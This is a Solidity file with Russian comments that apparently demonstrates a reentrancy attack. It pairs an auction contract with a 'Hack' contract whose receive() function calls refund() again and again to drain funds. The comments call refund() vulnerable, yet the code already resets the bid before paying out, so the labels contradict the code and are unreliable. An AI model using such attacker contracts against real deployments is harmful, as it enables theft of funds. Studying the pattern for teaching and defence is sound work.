// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

/**
 * @title AuctionReentrancy
 * @author HiH_DimaN
 * @notice Контракт аукциона, уязвимый к атаке Reentrancy.
 */
contract AuctionReentrancy {
    /**
     * @dev Отображение, хранящее ставки участников аукциона.
     */
    mapping(address bidder => uint) public bids; // Отображение ставок участников аукциона

    /**
     * @dev Функция для подачи ставки в аукционе.
     */
    function bid() external payable {
        bids[msg.sender] += msg.value; // Добавляем ставку к существующей ставке отправителя
    }
        
    /**
     * @dev Функция для возврата средств участникам аукциона.
     * Уязвима к атаке Reentrancy.
     */
    function refund() external {
        uint refundAmount = bids[msg.sender]; // Получаем сумму возврата для текущего участника

        bids[msg.sender] = 0; // Сбрасываем ставку текущего участника

        if (refundAmount > 0) {
            (bool ok,) = msg.sender.call{value: refundAmount}(""); // Отправляем средства текущему участнику
            require(ok, "can`t send"); // Проверяем успешность отправки

            // bids[msg.sender] = 0;  //  Эта строка должна быть перед вызовом msg.sender.call

        }

    }    
    
}

/**
 * @title Hack
 * @author HiH_DimaN
 * @notice Контракт, который атакует контракт AuctionReentrancy, используя атаку Reentrancy.
 */
contract Hack {
    /**
     * @dev Ссылка на атакуемый контракт.
     */
    AuctionReentrancy toHack; // Ссылка на атакуемый контракт

    /**
     * @dev Константа, определяющая сумму ставки.
     */
    uint constant BID_AMOUNT = 1 ether; // Сумма ставки

    /**
     * @dev Конструктор контракта, который атакует аукцион.
     * @param _toHack Адрес атакуемого контракта.
     */
    constructor(address _toHack) payable{
        require(msg.value == BID_AMOUNT); // Проверяем, что отправлена правильная сумма ставки

        toHack = AuctionReentrancy(_toHack); // Устанавливаем ссылку на атакуемый контракт
        toHack.bid{value: msg.value}(); // Делаем ставку в аукционе
    }

    /**
     * @dev Функция для выполнения атаки Reentrancy.
     */
    function hack() public {
        toHack.refund(); // Вызываем функцию refund() в атакуемом контракте
    }

    /**
     * @dev Функция, которая выполняет атаку Reentrancy, если баланс атакуемого контракта достаточен.
     */
    receive() external payable {
        if (address(toHack).balance >= BID_AMOUNT) {
            hack(); // Вызываем функцию hack(), если баланс атакуемого контракта больше или равен сумме ставки
        }
    }
}